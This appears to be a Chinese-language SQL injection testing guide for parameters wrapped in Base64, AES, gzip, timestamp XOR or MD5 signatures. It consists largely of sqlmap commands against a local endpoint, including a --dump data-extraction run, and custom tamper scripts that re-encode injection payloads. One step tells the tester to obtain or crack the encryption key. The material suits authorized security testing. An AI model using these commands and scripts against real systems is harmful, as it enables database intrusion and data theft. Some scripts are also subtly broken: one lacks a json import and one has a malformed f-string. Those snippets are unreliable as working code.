# 嵌套加密参数 SQL 注入测试场景

## 场景一：前端加密传输

### 背景
前端应用使用 JavaScript 对敏感参数进行 Base64 编码后发送给后端。

### 请求示例
```javascript
// 前端代码
const data = {
    req_id: generateId(),
    data: btoa(JSON.stringify({
        coupon_code: userInput
    }))
};
fetch('/api/coupon/query', {
    method: 'POST',
    body: JSON.stringify(data)
});
```

### 测试方法
1. 使用浏览器开发者工具拦截请求
2. 复制 data 字段值
3. Base64 解码查看内部结构
4. 构造注入 payload 并重新编码
5. 使用 SQLMap + tamper 脚本自动化测试

### SQLMap 命令
```bash
python sqlmap.py -u "http://127.0.0.1:9527/api/coupon/query" \
  --data='{"req_id":"1","data":"test"}' \
  --tamper=tamper_script \
  -p data --batch
```

---

## 场景二：API 网关统一加密

### 背景
API 网关对所有请求参数进行统一加密处理，后端服务解密后使用。

### 架构流程
```
客户端 -> API网关(加密) -> 后端服务(解密) -> 数据库
```

### 请求结构
```json
{
    "timestamp": 1640000000,
    "data": "Base64(AES(实际参数))"
}
```

### 测试方法
1. 分析加密算法（AES/3DES/RSA 等）
2. 获取或破解密钥
3. 编写自定义 tamper 脚本实现加解密
4. 使用 SQLMap 进行自动化测试

### Tamper 脚本示例（AES 加密）
```python
from Crypto.Cipher import AES
import base64

def tamper(payload, **kwargs):
    key = b'your-secret-key-'
    cipher = AES.new(key, AES.MODE_ECB)

    inner_data = {"coupon_code": payload}
    inner_json = json.dumps(inner_data)

    # 填充
    pad_len = 16 - len(inner_json) % 16
    padded = inner_json + chr(pad_len) * pad_len

    # 加密
    encrypted = cipher.encrypt(padded.encode())
    return base64.b64encode(encrypted).decode()
```

---

## 场景三：多层 JSON 嵌套

### 背景
复杂的微服务架构中，参数经过多层封装。

### 请求结构
```json
{
    "header": {
        "service": "user-service",
        "version": "v2"
    },
    "body": {
        "encrypted": "Base64({\"inner\":{\"sql\":\"SELECT...\"}})"
    }
}
```

### 测试方法
1. 逐层解码分析结构
2. 确定最终注入点位置
3. 编写递归处理的 tamper 脚本
4. 使用 SQLMap 测试最内层参数

---

## 场景四：混合编码

### 背景
参数使用多种编码方式组合。

### 示例
```
URL编码(Base64(压缩数据(JSON参数)))
```

### 测试方法
1. 逆向分析编码流程
2. 编写解码/编码函数
3. 在 tamper 脚本中实现完整流程
4. 验证每个环节的正确性

### Tamper 脚本示例
```python
import base64
import urllib.parse
import gzip
import json

def tamper(payload, **kwargs):
    # 构建内层数据
    inner = {"query": payload}
    
    # JSON -> gzip -> base64 -> URL encode
    json_str = json.dumps(inner)
    compressed = gzip.compress(json_str.encode())
    b64 = base64.b64encode(compressed).decode()
    url_encoded = urllib.parse.quote(b64)
    
    return url_encoded
```

---

## 场景五：动态密钥

### 背景
每次请求使用不同的密钥或时间戳进行加密。

### 示例
```json
{
    "timestamp": 1640000000,
    "content": "Base64(XOR(参数, timestamp))"
}
```

### 测试方法
1. 分析密钥生成逻辑
2. 在 tamper 脚本中动态计算密钥
3. 使用 `--eval` 参数配合 tamper 脚本

### Tamper 脚本示例
```python
import base64
import time

def tamper(payload, **kwargs):
    # 获取当前时间戳（与服务器同步）
    timestamp = int(time.time())
    
    # XOR 加密
    inner = f'{"param":"{payload}"}'
    key = str(timestamp)
    encrypted = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) 
                       for i, c in enumerate(inner))
    
    return base64.b64encode(encrypted.encode()).decode()
```

---

## 场景六：签名验证

### 背景
请求包含签名验证，防止篡改。

### 请求结构
```json
{
    "data": "Base64(参数)",
    "sign": "MD5(data + secretKey)"
}
```

### 测试方法
1. 分析签名算法
2. 在 tamper 脚本中重新计算签名
3. 同时修改 data 和 sign 字段

### Tamper 脚本示例
```python
import base64
import hashlib
import json

def tamper(payload, **kwargs):
    secret = "secret_key"

    # 构建数据
    inner = {"coupon_code": payload}
    data = base64.b64encode(json.dumps(inner).encode()).decode()

    # 计算签名
    sign = hashlib.md5((data + secret).encode()).hexdigest()

    # 返回完整请求体（需要在 --eval 中处理）
    return json.dumps({"data": data, "sign": sign})
```

---

## 通用测试流程

1. **分析请求结构**
   ```bash
   # 使用 Burp 或浏览器开发者工具
   # 复制请求内容
   # 逐层解码分析
   ```

2. **确定注入点**
   ```bash
   # 手动构造测试 payload
   # 验证注入可行性
   # 确定注入类型（错误/布尔/时间）
   ```

3. **编写 Tamper 脚本**
   ```bash
   # 根据加密/编码方式编写脚本
   # 在本地测试脚本正确性
   # 验证输出格式
   ```

4. **SQLMap 自动化测试**
   ```bash
   # 基础检测
   python sqlmap.py -u URL --data='{"req_id":"1","data":"test"}' --tamper=tamper_script -p data --batch

   # 提取数据
   python sqlmap.py -u URL --data='{"req_id":"1","data":"test"}' --tamper=tamper_script -p data --batch --dump
   ```

5. **结果验证**
   ```bash
   # 手动验证关键结果
   # 检查数据完整性
   # 确认漏洞影响范围
   ```

---

## 常见问题

### Q: SQLMap 无法识别注入点？
A: 检查 tamper 脚本是否正确生成 payload，使用 `--proxy` 参数查看实际请求。

### Q: 响应解析失败？
A: 如果响应也是加密的，SQLMap 可能无法自动解析，需要手动验证或使用 `--eval` 处理响应。

### Q: 编码后 payload 过长？
A: 某些编码方式会显著增加长度，可能需要调整服务器配置或使用其他注入技术。

### Q: 时间戳不同步？
A: 确保 tamper 脚本中的时间戳与服务器同步，或从响应中提取时间戳。
